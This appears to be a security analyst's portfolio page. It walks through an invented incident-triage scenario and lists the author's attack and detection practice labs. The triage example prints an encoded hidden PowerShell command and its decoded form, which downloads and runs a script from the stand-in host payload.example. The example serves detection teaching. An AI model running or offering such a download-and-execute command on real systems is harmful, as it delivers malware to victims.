How I work an alert

A practice scenario, written for this site. Step through it to see what I check and what I write down.

Ticket draftPractice scenario

EDR alert: Office application started PowerShell

The rule that fired watches for Office programs launching a shell. Word starting a hidden PowerShell window is rare, so the first question is whether anything here makes it expected.

parent  WINWORD.EXE
child   powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A…
host    FIN-LT-07
time    14:02:11

Check what the host and user normally do

I look up who uses the machine and what they do. This user opened an email attachment two minutes before the alert. No change ticket or software rollout explains a hidden shell. I also search for the same command on other hosts this week, and find none.

One host, one user, a recent attachment and no approved reason. That is enough to keep digging.

Decode the command and follow the network

The -enc argument is base64. Decoded, it downloads a script from an external address and runs it in memory. The firewall log shows the connection a second later.

decoded IEX (New-Object Net.WebClient).DownloadString('http://payload.example/a.ps1')
network outbound TCP 80 to payload.example at 14:02:13
True positive

Malicious until shown otherwise

Office started a hidden shell, the command was encoded, and it fetched remote code right after an attachment was opened. Each of those alone is a reason to look. Together they are an attack in progress.

Action: isolate the host from the EDR console, then escalate to the on-call contact in the SOP.

Write the ticket so the next person can act

Summary  Word started encoded PowerShell on FIN-LT-07 at 14:02.
Evidence Parent and child process, decoded download command,
         outbound connection to payload.example.
Verdict  True positive.
Action   Host isolated at 14:09. Escalated per SOP.
Open     Attachment hash. Other recipients of the email.

Findings, evidence, verdict, action and open questions. If someone reads only the ticket, they can pick up where I stopped.

The host, user and domain are invented. This is not client data.

Labs and projects

What I built to practise attack and detection. Public code is linked.

  • Lab

    Active Directory attack lab

    A domain built to be broken: a Windows Server domain controller, a Windows client and a Kali attacker. It carries deliberate weaknesses, including roastable service and user accounts, unconstrained delegation, GenericAll ACL abuse, a delegated GPO and an ADCS ESC1 template. I use it to practise attack paths up to DCSync and to write the results up as a pentest report.

    BloodHound, SharpHound, Nmap, Wireshark

  • Lab

    Web application pentest lab

    Assessments of DVWA with Burp Suite, SQLMap and OWASP ZAP, covering SQL injection, cross-site scripting and broken authentication. Each finding is rated with CVSS, explained, and given a fix, in the shape of a client report. I also studied the 2019 Capital One breach as a case study.

    Burp Suite, SQLMap, OWASP ZAP, Kali Linux, Python

  • Lab

    Android pentest lab

    Built at GBB. A Kali VM on Proxmox connected to an Android device or emulator through ADB and a network tunnel. I run static and dynamic analysis on APKs and look for insecure storage, exported components, hardcoded secrets, weak authentication and API flaws. Traffic goes through Burp Suite, and every finding is documented with impact and remediation.

    Kali Linux, Proxmox, ADB, MobSF, JADX, Burp Suite

  • In progress

    Footprinting and recon framework

    A Python framework that automates reconnaissance. Passive OSINT modules and active network modules run in one workflow, so the first hour of an engagement is repeatable instead of manual.

    Python

  • Prototype

    Network intrusion detection prototypes

    Three Python experiments in detecting hostile traffic. A Flask dashboard captures live packets with Scapy and scores them with a Random Forest trained on KDD Cup 99. A Streamlit app scores packets with simple rules, keeps an untrained LSTM as a placeholder, and asks Gemini to explain flagged packets. A PyTorch LSTM-DQN agent is set up to be tested on attack types held out of training. The README lists exactly which parts are demo-grade.

    Python, Scapy, scikit-learn, TensorFlow, PyTorch, Flask, Streamlit

    View the repository on GitHub
  • Tools

    Smaller security tools

    A multi-threaded TCP port scanner on raw sockets, written to understand scanning at the protocol level, and a web technology fingerprinting tool.

    Python, sockets, threading
